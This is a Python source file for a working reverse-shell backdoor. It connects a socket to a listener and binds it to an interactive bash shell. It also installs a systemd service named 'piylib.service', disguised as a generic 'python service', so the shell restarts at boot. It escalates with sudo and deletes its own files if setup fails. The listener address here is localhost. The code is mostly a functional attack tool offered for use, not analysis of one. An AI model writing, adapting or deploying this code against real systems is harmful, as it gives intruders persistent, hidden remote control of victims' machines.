# !/usr/bin/env python3

from subprocess import run
from os import dup2
import subprocess
import socket
import time
import os


# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyjeek                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Github  :   @Keyj33k                  #
#   Version :   1.0.5                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # #

start_directory = f"{os.path.dirname(os.path.abspath(__file__))}/main.py"
user = os.getlogin()

class Shell:

    def __init__(
            self,
            target_address,
            target_port
    ):
        self.target_address = target_address
        self.target_port = target_port

    def shell(self):
        with socket.socket(
            socket.AF_INET,  # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
            socket.SOCK_STREAM
        ) as socket_sock:
            socket_sock.connect((
                self.target_address,
                self.target_port
            ))

            dup2(
                socket_sock.fileno(),
                0
            )  # return stream integer file descriptor
            dup2(
                socket_sock.fileno(),
                1
            )  # used for request I/O actions from the OS
            dup2(
                socket_sock.fileno(),
                2
            )

            run(
                [
                    "/bin/bash",
                    "-i"
                ]
            )

            """
            Try this code below if you have any issues.
            run(
                [
                    "/bin/bash"
                ], 
                shell=True
            )
            """
    
    @staticmethod
    def create_persis(file_path):
        if not os.path.isfile(file_path):
            subprocess.run([
                "sudo",
                "touch",
                file_path
            ])

        if os.path.isfile(file_path):
            create_service = f"[Unit]\nDescription=python service\nAfter=network.service\n\n[Service]\nType=simple\nExecStart=/usr/bin/env python3 {start_directory}\nUser={user}\n\n[Install]\nWantedBy=multi-user.target"
            with open("/etc/systemd/system/piylib.service", "w") as servfile:
                servfile.write(create_service)

        try:
            subprocess.call([
                "systemctl",
                "daemon-reload"
            ])

            time.sleep(1.5)

            subprocess.call([
                "systemctl",
                "enable",
                "piylib.service"
            ])

            time.sleep(1.5)

            subprocess.call([
                "systemctl",
                "start",
                "piylib.service"
            ])

        except subprocess.CalledProcessError:
            try:
                os.system("systemctl daemon-reload")
                time.sleep(1.5)
                os.system("systemctl enable piylib.service")
                time.sleep(1.5)
                os.system("systemctl start piylib.service")
            except IOError:
                subprocess.run([
                    "rm",
                    "-rf",
                    file_path
                ])

                time.sleep(0.5)

                subprocess.run([
                    "rm",
                    "-rf",
                    __file__
                ])



if __name__ == "__main__":
    os.system('clear')

    if "SUDO_UID" not in os.environ.keys():
        subprocess.run([
            "sudo",
            "python3",
            __file__,
            "&"
        ])

    reverse_connection = Shell(
        "127.0.0.1",
        int(5003)
    )

    reverse_connection.create_persis("/etc/systemd/system/piylib.service")
    reverse_connection.shell()
